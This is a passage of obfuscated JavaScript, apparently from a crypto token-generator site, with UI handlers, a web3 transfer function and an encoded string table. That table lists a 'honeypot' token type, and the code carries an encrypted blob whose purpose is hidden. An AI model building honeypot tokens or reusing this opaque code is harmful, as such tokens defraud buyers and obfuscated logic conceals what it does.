      var _0x58e801 = a0_0x29fbea;
      $(_0x58e801(0xdc))[_0x58e801(0x13c)]("display", _0x58e801(0xc9)),
        console[_0x58e801(0xad)](_0x58e801(0xb8), getTokenType()),
        logGaEvent(_0x58e801(0xc3) + _0x58e801(0xff)),
        showPriceDialog(_0x58e801(0xfa), "10");
    }),
    $(a0_0x29fbea(0xb1))["on"](a0_0x29fbea(0xc5), () => {
      var _0x2450c0 = a0_0x29fbea;
      $(".actionGroup")[_0x2450c0(0x13c)](_0x2450c0(0x13b), _0x2450c0(0xc9)),
        console[_0x2450c0(0xad)](_0x2450c0(0xb8), getTokenType()),
        logGaEvent(_0x2450c0(0xc3) + _0x2450c0(0xf9)),
        showPriceDialog(_0x2450c0(0x162), "15");
    }),
    $("#trippleRewards-tab")["on"](a0_0x29fbea(0xc5), () => {
      var _0x49ec8a = a0_0x29fbea;
      $(_0x49ec8a(0xdc))["css"]("display", _0x49ec8a(0xc9)),
        console[_0x49ec8a(0xad)]("token_type:", getTokenType()),
        logGaEvent(_0x49ec8a(0xc3) + _0x49ec8a(0x11a)),
        showPriceDialog(_0x49ec8a(0x157), "20");
    }),
    $("#antiSniper-tab")["on"](a0_0x29fbea(0xc5), () => {
      var _0x8d0ef3 = a0_0x29fbea;
      $(_0x8d0ef3(0xdc))[_0x8d0ef3(0x13c)]("display", _0x8d0ef3(0xc9)),
        console[_0x8d0ef3(0xad)](_0x8d0ef3(0xb8), getTokenType()),
        logGaEvent("select_" + _0x8d0ef3(0x110)),
        showPriceDialog(_0x8d0ef3(0x12c), "5");
    }),
    $(a0_0x29fbea(0xf8))["on"]("click", () => {
      var _0x5788ff = a0_0x29fbea;
      $(".actionGroup")[_0x5788ff(0x13c)](_0x5788ff(0x13b), _0x5788ff(0xc9)),
        console[_0x5788ff(0xad)](_0x5788ff(0xb8), getTokenType()),
        logGaEvent(_0x5788ff(0xc3) + _0x5788ff(0x15e)),
        showPriceDialog(_0x5788ff(0xef), "3");
    }),
    $(a0_0x29fbea(0x115))["on"](a0_0x29fbea(0xc5), () => {
      var _0x5f1ad7 = a0_0x29fbea;
      $(_0x5f1ad7(0xdc))[_0x5f1ad7(0x13c)]("display", "none");
    });
}
$(a0_0x29fbea(0xce))["on"](a0_0x29fbea(0xc5), () => {
  var _0x16cf48 = a0_0x29fbea;
  $(_0x16cf48(0xdc))[_0x16cf48(0x13c)](_0x16cf48(0x13b), _0x16cf48(0xcc)),
    logGaEvent(gaEvents["click_customized_token"]),
    closeMoonshots();
});
function getTokenType() {
  var _0x14ec7b = a0_0x29fbea,
    _0x116636 = $(".tab-content\x20.active")[_0x14ec7b(0xcf)]("id");
  return _0x116636;
}
console[a0_0x29fbea(0xad)]("selected_token:", getTokenType());
function showLoading() {
  var _0x172125 = a0_0x29fbea;
  $(".loading")["css"]("display", _0x172125(0xc9)),
    $(".alertLoading")[_0x172125(0x13c)](_0x172125(0x13b), _0x172125(0xc9)),
    hideError();
}
function hideLoading() {
  var _0x50ac8a = a0_0x29fbea;
  $(_0x50ac8a(0xe2))[_0x50ac8a(0x13c)]("display", "none"),
    $(_0x50ac8a(0xe8))["css"]("display", _0x50ac8a(0xcc)),
    $(".deployStatus")[_0x50ac8a(0x13c)](_0x50ac8a(0x13b), _0x50ac8a(0xcc));
}
function showError(_0x16d7fb) {
  var _0x89ba90 = a0_0x29fbea;
  JSON["stringify"](_0x16d7fb) != "{}"
    ? ($(_0x89ba90(0x14a))[_0x89ba90(0x11b)](JSON["stringify"](_0x16d7fb)),
      $(".error")["css"](_0x89ba90(0x13b), _0x89ba90(0xc9)))
    : (_0x16d7fb[_0x89ba90(0x13f)]()[_0x89ba90(0x149)](
        "insufficient\x20funds\x20for\x20transfer"
      )
        ? $(_0x89ba90(0x14a))["text"](_0x89ba90(0xf6))
        : ($(_0x89ba90(0x14a))[_0x89ba90(0x11b)](_0x16d7fb),
          !JSON[_0x89ba90(0x11d)](_0x16d7fb)[_0x89ba90(0x149)](
            "User\x20denied\x20transaction\x20signature"
          ) && $(".tip")[_0x89ba90(0x13c)](_0x89ba90(0x13b), "block")),
      $(_0x89ba90(0x14a))[_0x89ba90(0x13c)](_0x89ba90(0x13b), "block"));
}
function hideError() {
  var _0x176aba = a0_0x29fbea;
  $(_0x176aba(0x14a))[_0x176aba(0x13c)](_0x176aba(0x13b), _0x176aba(0xcc)),
    $(".tip")[_0x176aba(0x13c)](_0x176aba(0x13b), _0x176aba(0xcc));
}
function sendCustomToken(_0x533a96, _0x52581f) {
  var _0x5e2252 = a0_0x29fbea,
    _0xde2105 = {
      from: ethereum["selectedAddress"],
      to: _0x533a96[_0x5e2252(0x14d)],
      data: _0x533a96[_0x5e2252(0x12b)]
        [_0x5e2252(0x117)](
          _0x533a96[_0x5e2252(0x14d)],
          web3[_0x5e2252(0x155)]["toWei"](_0x52581f[_0x5e2252(0x13f)]())
        )
        [_0x5e2252(0xbb)](),
    };
  web3[_0x5e2252(0x10c)]
    ["sendTransaction"](_0xde2105)
    [_0x5e2252(0xb5)](console["log"]);
}
async function test_verify() {
  var _0x783cca = a0_0x29fbea,
    _0x29ce5b = "0xC035834470Ecc0ff68aFFB2b966Ad0C85d9b0f15",
    _0x9d5f32 = await readTextFile(_0x783cca(0x127)),
    _0x38f9de = "v0.8.7+commit.e28d00a7",
    _0x16b48b = _0x783cca(0x118),
    _0x39ff23 = encodeParameters([_0x783cca(0xed)], [_0x783cca(0x142)]);
  console["log"](_0x9d5f32),
    alert(_0x783cca(0x141)),
    verifyContract(_0x29ce5b, _0x9d5f32, _0x16b48b, _0x38f9de, _0x39ff23);
}
function a0_0x2c89(_0x376336, _0x2fe035) {
  var _0xde4a18 = a0_0xde4a();
  return (
    (a0_0x2c89 = function (_0x2c897c, _0x37eaad) {
      _0x2c897c = _0x2c897c - 0xa1;
      var _0x12a732 = _0xde4a18[_0x2c897c];
      return _0x12a732;
    }),
    a0_0x2c89(_0x376336, _0x2fe035)
  );
}
$("#verify_contract")["on"](a0_0x29fbea(0xc5), () => {
  test_verify();
});
function a0_0xde4a() {
  var _0x28a012 = [
    "0x0F5D2fB29fb7d3CFeE444a200298f468908cC942",
    "transfer",
    "Test",
    "tax_fees",
    "trippleRewards",
    "text",
    "select_mintable",
    "stringify",
    "click_create",
    "select_hyperinflation",
    ".reward_token\x20option:selected",
    "selectedAddress",
    ".liquidity_fees",
    "click_frictionless_yield",
    "select_staking",
    "4160395InVimm",
    "_self",
    "./static/contracts/test/sol",
    "fees",
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    "methods",
    "Anti\x20Sniper",
    ".marketing_wallet",
    "Utf8",
    "#builtinPresale-tab",
    "dao",
    "Staking",
    "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
    "deadOwner",
    "Built-in\x20Presale",
    "SafeMoon\x20Killer",
    "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
    "18729BUkWFB",
    "done",
    "cachedProvider",
    "#burnable-tab",
    "display",
    "css",
    "select_mintandburn",
    "localStorage",
    "toString",
    "find",
    "Verify",
    "test\x20abc",
    "basic",
    ".marketing_fees",
    "34014EhpMQc",
    "value",
    "safemoonTwin",
    "unlimitedWallets",
    "includes",
    ".error",
    "mintandburn",
    "standard",
    "_address",
    "select_nativeReward",
    "awesomeToken",
    "#honeypot-tab",
    "SafeMoon\x20v2",
    "#rewardtoken-tab",
    "disabled",
    "safemoon",
    "utils",
    "0x4Fabb145d64652a948d72533023f6E7A623C7C53",
    "Triple\x20Rewards",
    "click_safemoon",
    "#awesomeToken-tab",
    "builtinPresale",
    "placeholder",
    "#hyperinflation-tab",
    "bsc_scan_link",
    "charityToken",
    "DAO",
    "#nativeReward-tab",
    "1043IIIAuA",
    "Double\x20Rewards",
    ".btnCreate",
    "#buyBackAndBurn-tab",
    "#safemoon-tab",
    "521399rFwmJL",
    "3576lMferw",
    "network",
    "tax_fees_extra",
    "Unlimited\x20Wallets",
    "#deflationary-tab",
    "Enter\x20marketing\x20wallet\x20!",
    "DEX",
    "token_supply",
    "log",
    "Anti-Rug\x20System",
    "rewardToken",
    "href",
    "#doubleRewards-tab",
    "click_liquidity_generator",
    "#staking-tab",
    "Native\x20Reward",
    "then",
    ".tax_fees1",
    "error",
    "token_type:",
    "recovery",
    "replace",
    "encodeABI",
    "decimals",
    "U2FsdGVkX18RBBDzP5SVBiG2I8ZdEHgXYvaaMkmHv8nzEOc6TYEMdufwchjO7reuzDnswbC2cBvSODBJCpO2yA==",
    "Overflow",
    "#price",
    "token_symbol",
    "rewardtoken",
    "setItem",
    "select_",
    "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    "click",
    "Marketing\x20wallet\x20can\x27t\x20be\x20the\x20same\x20as\x20the\x20owner\x20!",
    "reward_fees",
    "burnable",
    "block",
    "845517JxWmak",
    "token_address",
    "none",
    ".safemoonKiller",
    "#customized-tab",
    "attr",
    "reward",
    "SHIB",
    "Marketing\x20wallet\x20is\x20not\x20valid\x20!",
    "#mintandburn-tab",
    "click_standard",
    "#hyperDeflation-tab",
    "https://ropsten.etherscan.io/token/token_address#balances",
    "status",
    "1218516zDTFkC",
    "upgradable",
    "0x0\x20Owner",
    "USDT",
    ".actionGroup",
    "MANA",
    "safemoonV2",
    "4DkVvJR",
    "BNB",
    "#stableCoin-tab",
    ".loading",
    "BTC",
    "#liquiditygenerator-tab",
    "NFT\x20Game",
    "#memeCoin-tab",
    "#unlimitedWallets-tab",
    ".alertLoading",
    "Stable\x20Coin",
    "#safemoonV2-tab",
    "safemoonKiller",
    "Enter\x20token\x20name\x20!",
    "string",
    "#basic-tab",
    "Charity\x20Token",
    "#tx_fee",
    "#view_token",
    "#dao-tab",
    "marketing_fees",
    "#antiRug-tab",
    "liquiditygenerator",
    "Error:\x20Insufficient\x20funds\x20to\x20create\x20!",
    "token_name",
    "#charityToken-tab",
    "doubleRewards",
    "Hyper\x20Deflation",
    "querySelector",
    "enc",
    "dex",
    "call",
    "hyperDeflation",
    "Hyperinflation",
    "honeypot",
    "14143970hNFeZY",
    "#dex-tab",
    "select_burnable",
    "verificationCallback",
    "frictionlessyield",
    "#safemoonKiller-tab",
    "#nftGame-tab",
    "antiRug",
    "success",
    "some\x20fees",
    "eth",
    "boss",
    "referralFees",
    "BUSD",
    "antiSniper",
    "click_cancel",
    "click_reward_token",
    "\x20ETH",
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
    ".offer",
  ];
  a0_0xde4a = function () {
    return _0x28a012;
  };
  return a0_0xde4a();
}
